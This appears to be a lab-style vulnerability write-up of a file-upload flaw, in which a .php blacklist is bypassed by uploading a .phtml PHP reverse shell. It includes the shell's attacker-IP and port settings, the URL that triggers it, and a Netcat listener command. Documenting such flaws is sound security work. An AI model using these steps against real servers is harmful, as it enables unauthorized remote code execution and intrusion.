# Vulnerability Assesment: Remote Code Execution via Unrestricted File Upload

- Vulnerability Tittle : Unrestricted File Upload

- OWASP Top 10 Risk : A03:2021 - Injection

- CWE ID : CWE-434 Unrestricted Upload of File with Dangerous Type

- CVSS : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L

- Severity : High

- Target URL : http://10.48.186.114:3333/internal/ & http://10.48.186.114:3333/internal/uploads

### Description

The web application features a file upload mechanism at the `/internal/` directory that is vulnerable to Arbitrary File Upload. Although the system attempts to restrict file uploads by implementing an extension blacklist (blocking standard `.php` files), this filter is poorly configured.
An attacker can easily bypass this restriction by using alternative PHP extensions, such as `.phtml`. Because the underlying Apache web server is configured to execute `.phtml` files as PHP scripts, uploading a malicious reverse shell script allows the attacker to achieve Remote Code Execution (RCE) and gain unauthorized initial access to the underlying operating system.

### Attack Configuration

- Directory Fuzzing : Use tools like GoBuster / DirBuster / FFUF to URL Target: `http://10.48.186.114:3333`

- Reverse Shell : Download php-reverse-shell payload, [here](https://github.com/pentestmonkey/php-reverse-shell).

- The exploitation process is carried out using the Bypassing File Extension Filtering technique. We use Burp Suite to          intercept upload requests, then change the file extension from `.php` to `.phtml` to trick the server's blacklist filter.

- Attack Type : Sniper (targeting the `.php` parameter)
 
- Payload Type : Simple List Custom, [here payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md).

- Before executing the attack, the connection parameters within the PHP reverse shell script must be customized:
  - Open the script using a text editor (e.g., nano or mousepad)
    
  - Locate the configuration section and update the local IP ($ip) and listening port ($port) variables to establish a            connection back to the attacker's machine.
 
  - ```php
    $ip = '10.xx.xx.xx'; // Attacker's VPN IP
    $port = 4444;       // Attacker's Netcat Listening Port
    ```

- Once the payload is successfully uploaded, the attacker must trigger the execution by making an HTTP GET request to the       uploaded file's directory. Navigate to the following URL to invoke the shell:
  http://<TARGET_IP>/internal/uploads/php-reverse-shell.phtml

  Concurrently, a Netcat listener must be active on the attacker's machine (nc -lvnp <PORT>) to capture the incoming            connection, granting initial access as the www-data user.

### Exploitation Evidence (Proof Of Concept) :

After triggering the uploaded `.phtml` payload via the browser, the Netcat listener successfully intercepted the incoming connection from the target server. This confirms a successful Remote Code Execution (RCE), granting initial low-privilege access as the `www-data` user. 

To verify the active session and current working directory, standard system enumeration commands (`whoami`, `id`, `hostname`, and `pwd`) were executed.


